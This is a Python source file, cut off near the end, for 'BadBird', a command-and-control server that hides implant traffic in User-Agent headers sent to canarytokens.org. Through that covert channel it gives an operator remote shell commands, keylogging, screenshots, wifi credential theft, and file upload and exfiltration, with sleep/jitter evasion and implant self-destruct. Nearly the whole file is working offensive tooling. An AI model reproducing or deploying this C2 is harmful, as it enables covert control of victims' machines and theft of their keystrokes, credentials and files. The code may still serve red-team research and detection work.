#!/usr/bin/env python3

# I know I need to use classes. I'm just throwing this together for now

# BadBird C2 Through Canarytokens
# Author: Austin Martin @amartinsec/blog.amartinsec.com

# Imports
import base64
import platform
import re
import subprocess
import uuid

import requests
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from bs4 import BeautifulSoup
# TODO: fake_useragent is a pretty much a dead project. I'll add custom agents soon that will be used
from fake_useragent import UserAgent

from resources.modules.genimplant import *
from resources.modules.helpmenu import *
from resources.modules.postExp import *
from resources.modules.processhighlight import *

# Clear screen on start for colorama to work in Windows shell

# Globals
ua = UserAgent()
token = ""
url = ""
authtoken = ""
canaryManagementURL = ""
canaryJsonURL = ""
cmdcount = 0
email = "blah@foobar.com"
comment = "BadBird C2"
pwd = False
dir = ""
oldtoken = ""
connected = False
done = False
doneWaitForImplant = False
chunkedlen = 0
screenshotdone = False
selfdestuct = 168
ps = False
waitForKeys = False
lootpath = "loot/template"
requestedfile = ""
trackingString = ""
encrypted = True
BLOCK_SIZE = 128

#---------------Change Me---------------#
#-----------b'<32 length key>-----------#
key = b'badbirdbadbirdbadbirdbadbirdbadb'
#---------------------------------------#


def encrypt(message):
    if encrypted:
        try:
            cipher = AES.new(key, AES.MODE_ECB)
            encrypteddata = cipher.encrypt(pad(message,BLOCK_SIZE))
            encrypteddataunhex = encrypteddata.hex()
            return (encrypteddataunhex)

        except Exception as e:
            return ("Encryption Error")
    else:
        return message


def decrypt(encrypteddata):
    if encrypted:
        try:
            encrypteddata = bytes.fromhex(encrypteddata)
            decipher = AES.new(key, AES.MODE_ECB)
            msg_dec = decipher.decrypt(encrypteddata)
            return unpad(msg_dec, BLOCK_SIZE)

        except Exception as e:
            return ("Decryption Error")

    else:
        return encrypteddata


def generate_canarytoken():
    # Check if template loot dir exists. If not, create it
    if not os.path.exists(lootpath):
        os.makedirs(lootpath)

    stripedUA = ua.random

    headers = {"User-Agent": stripedUA.strip(), "Accept": "application/json, text/javascript, */*; q=0.01",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
               "Content-Type": "multipart/form-data; boundary=---------------------------190937841334444176471993165026",
               "Origin": "https://www.canarytokens.org", "Referer": "https://www.canarytokens.org/generate",
               "Sec-Fetch-Dest": "empty",
               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}

    genURL = "https://www.canarytokens.org:443/generate"

    generateReq = "-----------------------------190937841334444176471993165026\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\nweb\r" \
                  "\n-----------------------------190937841334444176471993165026\r\nContent-Disposition: form-data; " \
                  "name=\"email\"\r\n\r\n" + email + "\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                     "Content-Disposition: form-data; name=\"webhook\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                     "Content-Disposition: form-data; name=\"fmt\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                     "Content-Disposition: form-data; name=\"memo\"\r\n\r\n" + comment + "\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"cmd_process\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"clonedsite\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_table_name\"\r\n\r\nTABLE1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_view_name\"\r\n\r\nVIEW1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_function_name\"\r\n\r\nFUNCTION1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_trigger_name\"\r\n\r\nTRIGGER1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"redirect_url\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026--\r\n"

    response = requests.post(genURL, headers=headers, data=generateReq)

    if "200" not in str(response):
        print(Fore.RED + "[-]" + Fore.RESET + " Error generating token\n")
        print(Fore.RED + "[-]" + Fore.RESET + " Exiting...")
        sys.exit(1)

    else:
        print(Fore.BLUE + "[!]" + Fore.RESET + " Token successfully grabbed\n")
        global token
        token = response.json().get("Token")
        global url
        url = response.json().get("Url")
        global trackingString
        trackingString = str(uuid.uuid4())
        global authtoken
        authtoken = response.json().get("Auth")
        global canaryManagementURL
        canaryManagementURL = "https://www.canarytokens.org/history/?token=" + token + "&auth=" + authtoken
        print(Fore.BLUE + "[!]" + Fore.RESET + " Alert Token: " + token)
        print(Fore.BLUE + "[!]" + Fore.RESET + " Traffic Encryption: " + str(encrypted))
        print(Fore.BLUE + "[!]" + Fore.RESET + " Using key: " + str(key.decode()) + " for encryption")
        print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
        print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will self-destruct after: " + str(selfdestuct) + " hours of no activity")
        print(Fore.BLUE + "[!]" + Fore.RESET + " UUID For Implant: " + trackingString)
        print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL)


# Task implant with running command
def taskCommand(cmd):
    if pwd:
        cmd = "pwdtask:" + cmd

    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith(
            "download:") or cmd.startswith("wificreds:") or cmd.startswith("self-destruct:"):
        cmd = cmd

    # File upload logic
    if cmd.startswith("upload:"):
        try:
            requestedFile = cmd.split("upload:")[1]
            with open(requestedFile, 'rb') as binary_file:
                binary_file_data = binary_file.read()
                b64 = base64.b64encode(binary_file_data)
            binary_file.close()
            placeholder = encrypt(b64)
            split = [placeholder[i:i + 7000] for i in range(0, len(placeholder), 7000)]
            length = len(split)
            if len(split) >= 49:
                print(Fore.RED + "[-]" + Fore.RESET + " File is too large to upload")
                return
            lengthwarn = "uploadingfile:" + str(length) + ":" + requestedFile
            print (Fore.BLUE + "[!]" + Fore.RESET + " Uploading file in: " + str(length) + " chunks")
            warining = base64.b64encode(lengthwarn.encode('UTF-8'))
            warining = encrypt(warining)
            headers = {"User-Agent": warining,
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                       "Upgrade-Insecure-Requests": "1"}
            response = requests.get(url, headers=headers)
            time.sleep(3)
            for i in split:
                headers = {"User-Agent": i,
                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                           "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                           "Connection": "close",
                           "Upgrade-Insecure-Requests": "1"}
                response = requests.get(url, headers=headers)
            print(Fore.BLUE + "[!]" + Fore.RESET + " File uploaded successfully!")

        except:
            print("[-] Error uploading file file")
            return
        ########-End file upload logic-##########################

    else:
        cmd = "task:" + cmd

    cmd = base64.b64encode(cmd.encode("utf-8"))
    cmd = encrypt(cmd)
    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

    global oldtoken

    if oldtoken != "":
        response = requests.get(oldtoken, headers=headers)

    else:
        response = requests.get(url, headers=headers)



# Request to get results from command
def getResults(lastdictsize):
    stripedUA = ua.random
    global doneChunked
    doneChunked = False
    global screenshotdone
    screenshotdone = False
    global lootpath
    global requestedfile
    global ps

    headers = {
        "User-Agent": stripedUA.strip(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

    stringbuilder = ""
    chunkedlen = 0

    while True:
        reslist = []
        decodedlist = []
        response = requests.get(canaryManagementURL, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        data = soup.find_all("td")

        for tr in data:
            if "useragent" in tr.text:
                reslist.append(data[data.index(tr) + 1].text.strip())

        showChunkWarning = True

        if len(reslist) > 45:
            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Too many alerts for this token!")
            print(Fore.BLUE + "[!]" + Fore.RESET + " Try to rerun last command after reconnection...")
            time.sleep(5)
            fallback()
            return 1

        try:
            for count in reslist:
                cmd = base64.b64decode(decrypt(count)).decode('utf-8')

                # Response was too long to send in >50 chunks, generate new token
                if cmd == "toolong:":
                    print(
                        Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to reconstruct. Response can't be returned at this time (TOFIX)")
                    print(Fore.BLUE + "[!]" + Fore.RESET + " If not a sensitive command, try with encryption disabled")
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token to be safe")
                    fallback()
                    return 1

                # nightmare fuel
                elif cmd.startswith("chunked:"):
                    command = cmd.replace("chunked:", "")
                    chunkedlen = int(command)

                    # let user know we are breaking up the result
                    if showChunkWarning:
                        print(
                            Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to send in one request. We'll have to split it up into chunks")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Reassembling from " + command + " chunked requests...\n")
                        showChunkWarning = False
                        tChunk = threading.Thread(target=chunkAnimate)
                        tChunk.daemon = True
                        tChunk.start()

                    while True:
                        # now we start the logic loop of grabbing ALL chunks and reassembling them
                        chunkedlist = []
                        trash = []
                        response = requests.get(canaryManagementURL, headers=headers)
                        soupChunk = BeautifulSoup(response.text, 'html.parser')
                        trash = soupChunk.find_all("td")

                        for x in trash:
                            if "useragent" in x.text:
                                chunkedlist.append(x.find_next_sibling().string.strip())

                        # Loop until we have ALL the chunked data
                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                            stringbuilder = ""
                            holder = chunkedlist[:chunkedlen]
                            break

                        else:
                            chunkedlist.clear()
                            trash.clear()

                    # need to reverse the list
                    holder.reverse()
                    for q in holder:
                        stringbuilder+=q

                    time.sleep(1)
                    stringbuilder = base64.b64decode(decrypt(stringbuilder)).decode('utf-8')
                    decodedlist.append(stringbuilder)
                    doneChunked = True
                    stringbuilder = stringbuilder.replace("res:", "")

                    if ps:
                        ps = False
                        highlightprocesses(decodedlist[-1])
                        fallback()
                        return 1

                    print(Fore.GREEN + "[+]" + Fore.RESET + " Result: \n" + stringbuilder)
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token after chunked request...")
                    fallback()
                    return 1

                elif cmd.startswith("pic:"):
                    command = cmd.replace("pic:", "")
                    chunkedlen = int(command)

                    # let user know we are breaking up the result
                    if showChunkWarning:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Screenshot returning in multiple chunks")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Reassembling from " + command + " chunked requests...\n")
                        showChunkWarning = False
                        tChunk = threading.Thread(target=chunkAnimate)
                        tChunk.daemon = True
                        tChunk.start()

                    while True:
                        # now we start the logic loop of grabbing ALL chunks and reassembling them
                        chunkedlist = []
                        trash = []
                        response = requests.get(canaryManagementURL, headers=headers)
                        soupChunk = BeautifulSoup(response.text, 'html.parser')
                        trash = soupChunk.find_all("td")

                        for x in trash:
                            if "useragent" in x.text:
                                chunkedlist.append(x.find_next_sibling().string.strip())

                        # Loop until we have ALL the chunked data
                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                            stringbuilder = ""
                            holder = chunkedlist[:chunkedlen]
                            break

                        else:
                            chunkedlist.clear()
                            trash.clear()

                    # need to reverse the list
                    holder.reverse()
                    for q in holder:
                        stringbuilder += q

                    decodedlist.append(stringbuilder)
                    # Need to sleep for large requests
                    time.sleep(1)
                    doneChunked = True
                    # TOFIX:
                    imgbytes = base64.b64decode(decrypt(decodedlist[-1]))
                    timestr = time.strftime("%Y%m%d-%H%M%S")

                    with open(lootpath + timestr + ".jpg", "wb") as f:
                        f.write(imgbytes)
                        f.close()
                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Screenshot saved to " + lootpath + timestr + ".jpg")

                    # To open screenshot after capturing it
                    try:
                        os.system("start " + lootpath + timestr + ".jpg")
                    except:
                        pass

                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after screenshot...")
                    fallback()
                    return 1

                elif cmd.startswith("incomingfile:"):
                    command = cmd.replace("incomingfile:", "")
                    chunkedlen = int(command)

                    # let user know we are breaking up the result
                    if showChunkWarning:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " File returning in multiple chunks")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Reassembling from file from " + command + " chunked requests...\n")
                        showChunkWarning = False
                        tChunk = threading.Thread(target=chunkAnimate)
                        tChunk.daemon = True
                        tChunk.start()

                    while True:
                        # now we start the logic loop of grabbing ALL chunks and reassembling them
                        chunkedlist = []
                        trash = []
                        response = requests.get(canaryManagementURL, headers=headers)
                        soupChunk = BeautifulSoup(response.text, 'html.parser')
                        trash = soupChunk.find_all("td")

                        for x in trash:
                            if "useragent" in x.text:
                                chunkedlist.append(x.find_next_sibling().string.strip())

                        # Loop until we have ALL the chunked data
                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                            stringbuilder = ""
                            holder = chunkedlist[:chunkedlen]
                            break

                        else:
                            chunkedlist.clear()
                            trash.clear()

                    # need to reverse the list
                    holder.reverse()
                    for q in holder:
                        stringbuilder += q

                    decodedlist.append(stringbuilder)
                    # Need to sleep for large requests
                    time.sleep(1)
                    doneChunked = True
                    filebytes = base64.b64decode(decrypt(decodedlist[-1]))
                    timestr = time.strftime("%Y%m%d-%H%M%S")

                    with open(lootpath + timestr + requestedfile, "wb") as f:
                        f.write(filebytes)
                        f.close()
                    print(
                        Fore.GREEN + "\n\n[+]" + Fore.RESET + " File saved to " + lootpath + timestr + "_" + requestedfile)

                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after file grab...")
                    fallback()
                    return 1

                elif cmd.startswith("res:"):
                    command = cmd.replace("res:", "")
                    decodedlist.append(command)

                elif cmd.startswith("keys:"):
                    decodedlist.append(cmd)

                elif cmd.startswith("pwd:"):
                    command = cmd.replace("pwd:", "")
                    global dir
                    dir = command.split(":res:")[0]
                    result = command.split(":res:")[1]
                    result = result.replace(":res:", "")
                    decodedlist.append(result)

            # Ensure we are grabbing the latest results
            if len(reslist) > lastdictsize:
                # if error running command
                if (decodedlist[-1] == "Error with last ran command"):
                    print(Fore.RED + "[-] " + Fore.RESET + " Result: \n" + decodedlist[-1] + "\n")
                    #                    if logging == True:
                    #                        log("[-] Result: \n" + decodedlist[-1] + "\n")
                    break


                # if keylogging results
                elif decodedlist[-1].startswith("keys:"):
                    decodedlist[-1] = decodedlist[-1].replace("keys:", "")
                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Keystroke since last fetch: \n" + decodedlist[
                        -1] + "\n")
                    try:
                        with open(lootpath + "Keystroke_Log.txt", "a+") as f:
                            f.write(decodedlist[-1])
                            f.close()
                        print(
                            Fore.BLUE + "\n[!]" + Fore.RESET + " Saved/Updated keystrokes to: " + lootpath + "Keystroke_Log.txt\n")

                    except Exception as e:
                        print(Fore.RED + "[-]" + Fore.RESET + " Error saving keystrokes: " + str(e))
                        pass
                    break

                else:
                    if pwd == True:
                        print(decodedlist[-1])
                        break

                    else:
                        print(Fore.GREEN + "[+]" + Fore.RESET + " Result: \n" + decodedlist[-1])
                        break


        except Exception as e:
            pass

    return len(reslist) + 1


def wait_for_implant():
    global doneWaitForImplant
    doneWaitForImplant = False

    # cool animation time
    t = threading.Thread(target=animateWaitForImplant)
    t.daemon = True
    t.start()

    loop = True
    while loop:
        time.sleep(1)
        stripedUA = ua.random.strip()
        headers = {
            "User-Agent": stripedUA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
            "Upgrade-Insecure-Requests": "1"}

        response = requests.get(canaryManagementURL, headers=headers)

        if (response.status_code != 200):
            print(Fore.RED + "[-]" + Fore.RESET + "Error connecting... Exiting")
            sys.exit(1)

        else:
            try:
                useragents = []
                soup = BeautifulSoup(response.text, 'html.parser')
                data = soup.find_all("td")

                for tr in data:
                    if ("useragent" in tr.text):
                        useragents.append(data[data.index(tr) + 1].text.strip())

                for count in useragents:
                    cmd = base64.b64decode(decrypt(count)).decode('utf-8')
                    if cmd == "hello":
                        global connected
                        connected = True
                        loop = False

            except Exception as e:
                pass

    doneWaitForImplant = True
    print(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Implant connected!\n")


def implantSleep(time, jitter):
    cmd = "stime:" + str(time) + ":" + str(jitter)
    cmd = base64.b64encode(cmd.encode("utf-8"))
    cmd = encrypt(cmd)
    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}
    response = requests.get(url, headers=headers)


def keystrokes(keychoice):
    global lastdictsize
    global waitForKeys
    waitForKeys = False

    if keychoice == "start":
        cmd = base64.b64encode("keystart:".encode("utf-8"))
        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant now logging keystrokes\n")


    elif keychoice == "stop":
        cmd = base64.b64encode("keystop:".encode("utf-8"))
        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant stopped logging keystrokes\n")


    elif keychoice == "fetch":
        cmd = base64.b64encode("keyfetch:".encode("utf-8"))
        tkeystrokes = threading.Thread(target=animateFetchKeylog)
        tkeystrokes.daemon = True
        tkeystrokes.start()


    else:
        print(Fore.RED + "[-]" + Fore.RESET + " Error. Returning with keystrokes command\n")
        return

    cmd = encrypt(cmd)

    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

    response = requests.get(url, headers=headers)
    if keychoice == "fetch":
        lastdictsize = getResults(lastdictsize)
        waitForKeys = True


def fallback():
    try:
        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating fallback token...")
        global pwd
        pwd = False
        global oldtoken
        oldtoken = url
        generate_canarytoken()
        print(Fore.BLUE + "[!]" + Fore.RESET + " Sending implant the new token...")
        taskCommand("fallback:" + canaryManagementURL)
        oldtoken = ""
        global lastdictsize
        lastdictsize = 1
        wait_for_implant()
        return

    except Exception as e:
        print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
        pass


def killimplant(clean):
    if not clean:
        while True:
            choice = input(
                Fore.BLUE + "[!]" + Fore.RESET + " Do you want the implant to remove itself from the system? (y/n): ").lower()
            if choice == "y" or choice == "yes":
                print(Fore.BLUE + "[!]" + Fore.RESET + " Killing and removing implant from system...\n")
                clean = True
                break

            elif choice == "n" or choice == "no":
                print(Fore.BLUE + "\n[!]" + Fore.RESET + " Implant will stay on the system...\n")
                clean = False
                break

            else:
                print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                continue

    else:
        print(Fore.BLUE + "[!]" + Fore.RESET + " Killing and removing implant from system...\n")

    if clean:
        cmd = "solongclean:"

    else:
        cmd = "solongdirty:"

    cmd = base64.b64encode(cmd.encode("utf-8"))
    cmd = encrypt(cmd)
    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}
    response = requests.get(url, headers=headers)
    print(Fore.BLUE + "[!]" + Fore.RESET + " Implant Killed!\n")

def serverExit():
    global connected
    if connected:
        print(Fore.RED + "[-]" + Fore.RESET + " You currently have an implant connected.")
        print(
            Fore.RED + "[-]" + Fore.RESET + " Would you like to kill the implant before disconnecting? (`y`/`n`/`b`)")
        choice = input(Fore.RED + "[-]" + Fore.RESET + " Choice: ").lower()
        if choice == "y" or choice == "yes":
            killimplant(False)
            sys.exit()

        elif choice == "n" or choice == "no":
            sys.exit()

        elif choice == "b" or choice == "back":
            return

        else:
            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n/b` or `yes/no/back`")
            return

    else:
        print(Fore.BLUE + "[!]" + Fore.RESET + " Exiting...")
        sys.exit(1)



def checkKey():
    if len(key.decode()) != 32:
        print(Fore.RED + "[-]" + Fore.RESET + " Error: Key is not 32 bytes. Please check your key and try again.")
        sys.exit(1)


def main():
    init(convert=True)
    os.system('cls' if os.name == 'nt' else 'clear')
    welcome()
    # Need to investigate further, but running on Linux was extremely unstable so adding below:
    currentOS = platform.system()
    if currentOS != "Windows":
        print(
            Fore.RED + "\n[-]" + Fore.RESET + " Some highlight/color functionality will not work in a nix shell")
        print(
            Fore.RED + "\n[-]" + Fore.RESET + " I'm fixing this. Sorry :<( \n")


    checkKey()
    global lastdictsize
    lastdictsize = 1
    global pwd
    global connected
    global url
    global selfdestuct
    global lootpath
    global requestedfile
    lootpath = "loot/template/"
    global canaryManagementURL
    try:
        while True:
            try:
                if pwd == False:
                    cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
                else:
                    try:
                        cmd = input("\n" + Fore.GREEN + dir.strip() + "> " + Fore.RESET)
                    except:
                        cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)

                if cmd.lower() == "exit":
                    serverExit()

                elif cmd.lower() == "help":
                    help()

                elif cmd.lower().startswith("local "):
                    try:
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Result of local command:")
                        out = subprocess.run(cmd.split("local ")[1], shell=True)

                    except:
                        pass

                #TODO connect to listening implant
                elif cmd.lower().startswith("connect "):
                    try:
                        cmd = cmd.replace("connect ", "")
                        canaryManagementURL = cmd
                        start = "token="
                        end = "&auth="
                        url = ("http://canarytokens.com/about/" + canaryManagementURL[
                                                                  canaryManagementURL.index(start) + len(start):
                                                                  canaryManagementURL.index(end)] + "/contact.php")

                    except Exception as e:
                        print(e)
                        print(Fore.RED + "[-]" + Fore.RESET + " Error, with the management URL. Please try again.")
                        continue


                elif cmd.lower().startswith("sleep"):
                    if connected:
                        try:
                            sleeptime = cmd.split("sleep ")[1]
                            try:
                                jitterpercent = sleeptime.split(" ")[1]
                            except:
                                jitterpercent = 0
                            sleeptime = sleeptime.split(" ")[0]
                            if int(jitterpercent) > 100 or int(jitterpercent) < 0:
                                print(Fore.RED + "[-]" + Fore.RESET + " Jitter percentage has to be between 0-100.")
                                continue
                            if int(sleeptime) <= 0:
                                print(Fore.RED + "[-]" + Fore.RESET + " Sleep time must be greater than 0.")
                                continue
                            implantSleep(int(sleeptime), int(jitterpercent))
                            if jitterpercent != 0:
                                print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
                                    sleeptime) + " seconds with a " + jitterpercent + "% jitter before checking in with the canarytokens.org server\n")
                            else:
                                print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
                                    sleeptime) + " seconds before checking in with the canarytokens.org server\n")


                        except Exception as e:
                            print(e)
                            print(
                                Fore.RED + "[-]" + Fore.RESET + " Error with sleep command. Format is: sleep <time in seconds> <jitter percent amount>\n")
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


                elif cmd.lower().startswith("email "):
                    try:
                        global email
                        # regex for a valid email
                        regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                        enteredemail = cmd.split("email ")[1]
                        if re.fullmatch(regex, enteredemail):
                            email = enteredemail
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Will now use `" + email + "` for creating tokens\n")
                        else:
                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid email address\n")

                    except:
                        print(Fore.RED + "[-]" + Fore.RESET + " Error with setting new email\n")


                elif cmd.lower() == "pwd":
                    if connected:
                        if not pwd:
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
                            pwd = True
                        else:
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Removing current path from output")
                            pwd = False
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.lower() == "fallback":
                    if connected:
                        fallback()
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.lower() == "kill":
                    if connected:
                        killimplant(False)
                        connected = False
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


                elif cmd.lower() == "kill clean":
                    if connected:
                        killimplant(True)
                        connected = False
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


                elif cmd.lower() == "post-exp":
                    if connected:
                        print("\n")
                        while True:
                            cmd = postExpShell(encrypted)
                            if cmd != "":
                                taskCommand(cmd)
                                lastdictsize = getResults(lastdictsize)
                                print("")
                            # Else - means `back` command was entered indicating exit of shell
                            else:
                                break
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.lower() == "screenshot":
                    if connected:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
                        fallback()
                        time.sleep(1)
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
                        taskCommand("saycheese:")
                        lastdictsize = getResults(lastdictsize)

                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.startswith("download "):
                    if connected:
                        requestedfile = cmd.split("download ")[1]
                        fallback()
                        time.sleep(1)
                        taskCommand("download:" + requestedfile)
                        lastdictsize = getResults(lastdictsize)
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.startswith("upload "):
                    if connected:
                        requestedfile = cmd.split("upload ")[1]
                        if os.path.exists(requestedfile):
                            fallback()
                            time.sleep(1)
                            taskCommand("upload:" + requestedfile)
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Fallbacking after upload...")
                            time.sleep(1)
                            fallback()
                        else:
                            print(Fore.RED + "[-]" + Fore.RESET + " File not found\n")
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.startswith("self-destruct "):
                    if connected:
                        if cmd.split("self-destruct ")[1].isdigit():
                            selfdestuct = cmd.split("self-destruct ")[1]
                            taskCommand("self-destruct:" + selfdestuct)
                            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Implant will now self-destruct after " + selfdestuct + " hours of no activity\n")
                        else:
                            print(Fore.RED + "[-]" + Fore.RESET + " Self-destruct time must be a positive integer \n")

                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.lower() == "create-implant":
                    if connected:
                        print(
                            Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
                        choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
                        if choice == "y" or choice == "yes":
                            if canaryManagementURL == "":
                                print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                                generate_canarytoken()
                            lootpath = generateimplant(canaryManagementURL,key)
                            wait_for_implant()
                            continue
                        elif choice == "n" or choice == "no":
                            continue
                        else:
                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                            continue
                    else:
                        if canaryManagementURL == "":
                            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                            generate_canarytoken()
                        lootpath = generateimplant(canaryManagementURL,key)
                        wait_for_implant()

                elif cmd.lower() == "create-token":
                    if connected:
                        print(
                            Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
                        choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
                        if choice == "y" or choice == "yes":
                            connected = False
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
                            lastdictsize = 1
                            generate_canarytoken()
                            wait_for_implant()
                            continue

                        elif choice == "n" or choice == "no":
                            continue

                        else:
                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                            continue
                    else:
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
                        generate_canarytoken()
                        wait_for_implant()

                elif cmd.lower() == "canary-info":
                    if connected:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Alert Token: " + token)
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Traffic Encryption: " + str(encrypted))
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Using key: " + str(key.decode()) + " for encryption")
                        print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
